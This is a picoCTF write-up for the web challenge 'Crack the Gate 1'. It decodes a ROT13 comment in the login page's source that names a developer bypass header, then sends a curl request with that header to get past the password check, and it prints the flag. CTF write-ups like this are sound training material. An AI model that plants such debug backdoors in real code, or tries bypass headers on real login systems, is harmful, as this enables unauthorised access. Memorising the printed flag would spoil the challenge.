---
title: "Crack the Gate 1"
category: "Web Exploitation"
description: "We're in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal."
---

## Information given

#### Description

We're in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We've uncovered the email address he uses to log in: `ctf-player@picoctf.org`. Unfortunately, we don't know the password, and the usual guessing techniques haven't worked. But something feels off... it's almost like the developer left a secret way in. Can you figure it out?

Additional details will be available after launching your challenge instance.

#### Hints
Developers sometimes leave notes in the code; but not always in plain text.
A common trick is to rotate each letter by 13 positions in the alphabet.

## Solution

Let's start by launching the instance.

After the instance is launched, let's read the "notes in the code". The hint is referring to comments:

To see code: right click > View Page Source.

The source code:

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #eaeaed;
            font-family: Arial, sans-serif;
        }

        #loginForm {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        #loginForm label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        #loginForm input {
            width: calc(100% - 10px);
            padding: 8px;
            margin-bottom: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        #loginForm button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            border: none;
            color: white;
            border-radius: 4px;
            font-size: 16px;
        }

        #loginForm button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
    <!-- Remove before pushing to production! -->   

    <form id="loginForm">
        <h2 style="font-size: 24px; margin-bottom: 24px;">
            Login
        </h2>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.success) {
                    prompt('Login successful!\nFlag:', data.flag);
                } else {
                    alert('Invalid credentials');
                }
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
```

The important part:

```
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
```

This seems to be ROT13 encoding:

![[Screenshot 2025-10-01 at 20.10.46.png]]

Let's craft the curl payload:

```bash
siddharthsehgal@mac LAST_DIR % curl -i -X POST 'http://amiable-citadel.picoctf.net:50897/login' \

  -H 'Content-Type: application/json' \

  -H 'X-Dev-Access: yes' \

  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'

  

HTTP/1.1 200 OK

**X-Powered-By**: Express

**Content-Type**: application/json; charset=utf-8

**Content-Length**: 127

**ETag**: W/"7f-OXFNNEgUDQ6luMcdemqCj4aTy9o"

**Date**: Wed, 01 Oct 2025 18:15:33 GMT

**Connection**: keep-alive

**Keep-Alive**: timeout=5

  

{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_7e5db33b}"}
```

So the flag is: `picoCTF{brut4_f0rc4_7e5db33b}`.

---